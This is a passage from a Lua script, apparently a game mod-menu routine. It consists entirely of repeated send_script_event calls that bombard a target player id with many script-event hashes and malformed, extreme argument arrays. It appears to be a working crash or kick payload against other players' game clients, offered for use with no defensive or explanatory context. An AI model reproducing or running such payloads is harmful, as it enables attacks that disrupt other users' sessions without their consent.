                -10,
                -10,
                -10
            }
        )
        send_script_event(
            -1491386500,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                pid,
                -10,
                pid
            }
        )
        send_script_event(-1491386500, pid, {pid, 23048976 + 1 + pid * 595 + 506})
        send_script_event(-1491386500, pid, {pid, 23048976 + 1 + pid * 695 + 507})
        send_script_event(-1491386500, pid, {pid, 1630317 + 1 + pid * 989 + 555})
        send_script_event(-1491386500, pid, {0, 0, 46190868, 0, 2})
        send_script_event(-1491386500, pid, {46190868, 0, 46190868, 46190868, 2})
        send_script_event(-1491386500, pid, {1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-1491386500, pid, {pid, 1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-1491386500, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(-1491386500, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-1491386500, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1491386500, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1491386500, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-1491386500, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-1491386500, pid, {-1139568479, -1, 1, 100099})
        send_script_event(
            -1491386500,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(
            -1491386500,
            pid,
            {
                -1,
                -1,
                -1,
                -1,
                -1139568479,
                -1,
                1,
                100099,
                -1,
                500000,
                849451549,
                -1,
                -1,
                91645,
                -99683,
                1788,
                60877,
                55085,
                72028
            }
        )
        send_script_event(
            -1491386500,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(-2120750352, pid, {pid, 532165, pid})
        send_script_event(-2120750352, pid, {pid, 532165})
        send_script_event(-2120750352, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -2120750352,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-2120750352, pid, {-1, 0})
        send_script_event(
            -2120750352,
            pid,
            {pid, -1726396442, 428882541, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10}
        )
        send_script_event(-2120750352, pid, {pid, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10})
        send_script_event(-2120750352, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -2120750352,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-2120750352, pid, {-1, 0})
        send_script_event(-2120750352, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -2120750352,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-2120750352, pid, {-1, 0})
        send_script_event(-2120750352, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -2120750352,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-2120750352, pid, {-1, 0})
        send_script_event(-2120750352, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-2120750352, pid, {pid, -13, -12, -11, -10, 19, pid, 10, 10, 10, 10, -1, -11, -19, -506, 506})
        send_script_event(-2120750352, pid, {pid, 532165, pid})
        send_script_event(-2120750352, pid, {pid, 532165, pid})
        send_script_event(-2120750352, pid, {pid, 532165, pid})
        send_script_event(-2120750352, pid, {pid, 532165})
        send_script_event(-2120750352, pid, {1, 0})
        send_script_event(-2120750352, pid, {0, -1})
        send_script_event(
            -2120750352,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(
            -2120750352,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                pid,
                -10,
                pid
            }
        )
        send_script_event(-2120750352, pid, {pid, 23048976 + 1 + pid * 595 + 506})
        send_script_event(-2120750352, pid, {pid, 23048976 + 1 + pid * 695 + 507})
        send_script_event(-2120750352, pid, {pid, 1630317 + 1 + pid * 989 + 555})
        send_script_event(-2120750352, pid, {0, 0, 46190868, 0, 2})
        send_script_event(-2120750352, pid, {46190868, 0, 46190868, 46190868, 2})
        util.yield(1)
        send_script_event(-2120750352, pid, {1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-2120750352, pid, {pid, 1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-2120750352, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(-2120750352, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-2120750352, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-2120750352, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-2120750352, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-2120750352, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-2120750352, pid, {-1139568479, -1, 1, 100099})
        send_script_event(
            -2120750352,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(
            -2120750352,
            pid,
            {
                -1,
                -1,
                -1,
                -1,
                -1139568479,
                -1,
                1,
                100099,
                -1,
                500000,
                849451549,
                -1,
                -1,
                91645,
                -99683,
                1788,
                60877,
                55085,
                72028
            }
        )
        send_script_event(
            -2120750352,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(0xF5CB92DB, pid, {pid, 532165, pid})
        send_script_event(0xF5CB92DB, pid, {pid, 532165})
        send_script_event(0xF5CB92DB, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            0xF5CB92DB,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(0xF5CB92DB, pid, {-1, 0})
        send_script_event(
            0xF5CB92DB,
            pid,
            {pid, -1726396442, 428882541, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10}
        )
        send_script_event(0xF5CB92DB, pid, {pid, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10})
        send_script_event(0xF5CB92DB, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            0xF5CB92DB,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(0xF5CB92DB, pid, {-1, 0})
        send_script_event(0xF5CB92DB, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            0xF5CB92DB,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(0xF5CB92DB, pid, {-1, 0})
        send_script_event(0xF5CB92DB, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            0xF5CB92DB,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(0xF5CB92DB, pid, {-1, 0})
        send_script_event(0xF5CB92DB, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0xF5CB92DB, pid, {pid, -13, -12, -11, -10, 19, pid, 10, 10, 10, 10, -1, -11, -19, -506, 506})
        send_script_event(0xF5CB92DB, pid, {pid, 532165, pid})
        send_script_event(0xF5CB92DB, pid, {pid, 532165, pid})
        send_script_event(0xF5CB92DB, pid, {pid, 532165, pid})
        send_script_event(0xF5CB92DB, pid, {1, 0})
        send_script_event(0xF5CB92DB, pid, {0, -1})
        send_script_event(
            0xF5CB92DB,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(
            0xF5CB92DB,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                pid,
                -10,
                pid
            }
        )
        send_script_event(0xF5CB92DB, pid, {pid, 23048976 + 1 + pid * 595 + 506})
        send_script_event(0xF5CB92DB, pid, {pid, 23048976 + 1 + pid * 695 + 507})
        send_script_event(0xF5CB92DB, pid, {pid, 1630317 + 1 + pid * 989 + 555})
        send_script_event(0xF5CB92DB, pid, {0, 0, 46190868, 0, 2})
        send_script_event(0xF5CB92DB, pid, {46190868, 0, 46190868, 46190868, 2})
        send_script_event(0xF5CB92DB, pid, {1337, -1, 1, 1, 0, 0, 0})
        send_script_event(0xF5CB92DB, pid, {pid, 1337, -1, 1, 1, 0, 0, 0})
        send_script_event(0xF5CB92DB, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(0xF5CB92DB, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(0xF5CB92DB, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0xF5CB92DB, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0xF5CB92DB, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(0xF5CB92DB, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(0xF5CB92DB, pid, {-1139568479, -1, 1, 100099})
        send_script_event(
            0xF5CB92DB,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(
            0xF5CB92DB,
            pid,
            {
                -1,
                -1,
                -1,
                -1,
                -1139568479,
                -1,
                1,
                100099,
                -1,
                500000,
                849451549,
                -1,
                -1,
                91645,
                -99683,
                1788,
                60877,
                55085,
                72028
            }
        )
        send_script_event(
            0xF5CB92DB,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(0xc5bc4c4b, pid, {pid, 532165, pid})
        send_script_event(0xc5bc4c4b, pid, {pid, 532165})
        send_script_event(0xc5bc4c4b, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            0xc5bc4c4b,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(0xc5bc4c4b, pid, {-1, 0})
        send_script_event(
            0xc5bc4c4b,
            pid,
            {pid, -1726396442, 428882541, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10}
        )
        send_script_event(0xc5bc4c4b, pid, {pid, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10})
        send_script_event(0xc5bc4c4b, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            0xc5bc4c4b,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(0xc5bc4c4b, pid, {-1, 0})
        send_script_event(0xc5bc4c4b, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            0xc5bc4c4b,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(0xc5bc4c4b, pid, {-1, 0})
        send_script_event(0xc5bc4c4b, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            0xc5bc4c4b,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(0xc5bc4c4b, pid, {-1, 0})
        send_script_event(0xc5bc4c4b, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0xc5bc4c4b, pid, {pid, -13, -12, -11, -10, 19, pid, 10, 10, 10, 10, -1, -11, -19, -506, 506})
        send_script_event(0xc5bc4c4b, pid, {pid, 532165, pid})
        send_script_event(0xc5bc4c4b, pid, {pid, 532165, pid})
        send_script_event(0xc5bc4c4b, pid, {pid, 532165, pid})
        send_script_event(0xc5bc4c4b, pid, {1, 0})
        send_script_event(0xc5bc4c4b, pid, {0, -1})
        send_script_event(
            0xc5bc4c4b,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(
            0xc5bc4c4b,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                pid,
                -10,
                pid
            }
        )
        send_script_event(0xc5bc4c4b, pid, {pid, 23048976 + 1 + pid * 595 + 506})
        send_script_event(0xc5bc4c4b, pid, {pid, 23048976 + 1 + pid * 695 + 507})
        send_script_event(0xc5bc4c4b, pid, {pid, 1630317 + 1 + pid * 989 + 555})
        send_script_event(0xc5bc4c4b, pid, {0, 0, 46190868, 0, 2})
        send_script_event(0xc5bc4c4b, pid, {46190868, 0, 46190868, 46190868, 2})
        send_script_event(0xc5bc4c4b, pid, {1337, -1, 1, 1, 0, 0, 0})
        send_script_event(0xc5bc4c4b, pid, {pid, 1337, -1, 1, 1, 0, 0, 0})
        send_script_event(0xc5bc4c4b, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(0xc5bc4c4b, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(0xc5bc4c4b, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0xc5bc4c4b, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0xc5bc4c4b, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(0xc5bc4c4b, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(0xc5bc4c4b, pid, {-1139568479, -1, 1, 100099})
        send_script_event(
            0xc5bc4c4b,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(
            0xc5bc4c4b,
            pid,
            {
                -1,
                -1,
                -1,
                -1,
                -1139568479,
                -1,
                1,
                100099,
                -1,
                500000,
                849451549,
                -1,
                -1,
                91645,
                -99683,
                1788,
                60877,
                55085,
                72028
            }
        )
        send_script_event(
            0xc5bc4c4b,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(-2122716210, pid, {pid, 532165, pid})
        send_script_event(-2122716210, pid, {pid, 532165})
        send_script_event(-2122716210, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -2122716210,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-2122716210, pid, {-1, 0})
        send_script_event(
            -2122716210,
            pid,
            {pid, -1726396442, 428882541, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10}
        )
        send_script_event(-2122716210, pid, {pid, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10})
        send_script_event(-2122716210, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -2122716210,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-2122716210, pid, {-1, 0})
        send_script_event(-2122716210, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -2122716210,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-2122716210, pid, {-1, 0})
        send_script_event(-2122716210, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -2122716210,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-2122716210, pid, {-1, 0})
        send_script_event(-2122716210, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-2122716210, pid, {pid, -13, -12, -11, -10, 19, pid, 10, 10, 10, 10, -1, -11, -19, -506, 506})
        send_script_event(-2122716210, pid, {pid, 532165, pid})
        send_script_event(-2122716210, pid, {pid, 532165, pid})
        send_script_event(-2122716210, pid, {pid, 532165, pid})
        send_script_event(-2122716210, pid, {1, 0})
        send_script_event(-2122716210, pid, {0, -1})
        send_script_event(
            -2122716210,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(
            -2122716210,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                pid,
                -10,
                pid
            }
        )
        send_script_event(-2122716210, pid, {pid, 23048976 + 1 + pid * 595 + 506})
        send_script_event(-2122716210, pid, {pid, 23048976 + 1 + pid * 695 + 507})
        send_script_event(-2122716210, pid, {pid, 1630317 + 1 + pid * 989 + 555})
        send_script_event(-2122716210, pid, {0, 0, 46190868, 0, 2})
        send_script_event(-2122716210, pid, {46190868, 0, 46190868, 46190868, 2})
        send_script_event(-2122716210, pid, {1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-2122716210, pid, {pid, 1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-2122716210, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(-2122716210, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-2122716210, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-2122716210, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-2122716210, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-2122716210, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-2122716210, pid, {-1139568479, -1, 1, 100099})
        send_script_event(
            -2122716210,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(
            -2122716210,
            pid,
            {
                -1,
                -1,
                -1,
                -1,
                -1139568479,
                -1,
                1,
                100099,
                -1,
                500000,
                849451549,
                -1,
                -1,
                91645,
                -99683,
                1788,
                60877,
                55085,
                72028
            }
        )
        send_script_event(
            -2122716210,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(-977515445, pid, {pid, 532165, pid})
        send_script_event(-977515445, pid, {pid, 532165})
        send_script_event(-977515445, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -977515445,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-977515445, pid, {-1, 0})
        send_script_event(
            -977515445,
            pid,
            {pid, -1726396442, 428882541, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10}
        )
        send_script_event(-977515445, pid, {pid, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10})
        send_script_event(-977515445, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -977515445,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-977515445, pid, {-1, 0})
        send_script_event(-977515445, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -977515445,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-977515445, pid, {-1, 0})
        send_script_event(-977515445, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -977515445,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-977515445, pid, {-1, 0})
        send_script_event(-977515445, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-977515445, pid, {pid, -13, -12, -11, -10, 19, pid, 10, 10, 10, 10, -1, -11, -19, -506, 506})
        send_script_event(-977515445, pid, {pid, 532165, pid})
        send_script_event(-977515445, pid, {pid, 532165, pid})
        send_script_event(-977515445, pid, {pid, 532165, pid})
        send_script_event(-977515445, pid, {1, 0})
        send_script_event(-977515445, pid, {0, -1})
        send_script_event(
            -977515445,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(
            -977515445,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                pid,
                -10,
                pid
            }
        )
        send_script_event(-977515445, pid, {pid, 23048976 + 1 + pid * 595 + 506})
        send_script_event(-977515445, pid, {pid, 23048976 + 1 + pid * 695 + 507})
        send_script_event(-977515445, pid, {pid, 1630317 + 1 + pid * 989 + 555})
        send_script_event(-977515445, pid, {0, 0, 46190868, 0, 2})
        send_script_event(-977515445, pid, {46190868, 0, 46190868, 46190868, 2})
        send_script_event(-977515445, pid, {1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-977515445, pid, {pid, 1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-977515445, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(-977515445, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-977515445, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-977515445, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-977515445, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-977515445, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-977515445, pid, {-1139568479, -1, 1, 100099})
        send_script_event(
            -977515445,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(
            -977515445,
            pid,
            {
                -1,
                -1,
                -1,
                -1,
                -1139568479,
                -1,
                1,
                100099,
                -1,
                500000,
                849451549,
                -1,
                -1,
                91645,
                -99683,
                1788,
                60877,
                55085,
                72028
            }
        )
        send_script_event(
            -977515445,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(767605081, pid, {pid, 532165, pid})
        send_script_event(767605081, pid, {pid, 532165})
        send_script_event(767605081, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            767605081,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(767605081, pid, {-1, 0})
        send_script_event(767605081, pid, {pid, -1726396442, 428882541, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10})
        send_script_event(767605081, pid, {pid, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10})
        send_script_event(767605081, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            767605081,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(767605081, pid, {-1, 0})
        send_script_event(767605081, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            767605081,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(767605081, pid, {-1, 0})
        send_script_event(767605081, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            767605081,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(767605081, pid, {-1, 0})
        send_script_event(767605081, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(767605081, pid, {pid, -13, -12, -11, -10, 19, pid, 10, 10, 10, 10, -1, -11, -19, -506, 506})
        send_script_event(767605081, pid, {pid, 532165, pid})
        send_script_event(767605081, pid, {pid, 532165, pid})
        send_script_event(767605081, pid, {pid, 532165, pid})
        send_script_event(767605081, pid, {1, 0})
        send_script_event(767605081, pid, {0, -1})
        send_script_event(
            767605081,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(
            767605081,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                pid,
                -10,
                pid
            }
        )
        send_script_event(767605081, pid, {pid, 23048976 + 1 + pid * 595 + 506})
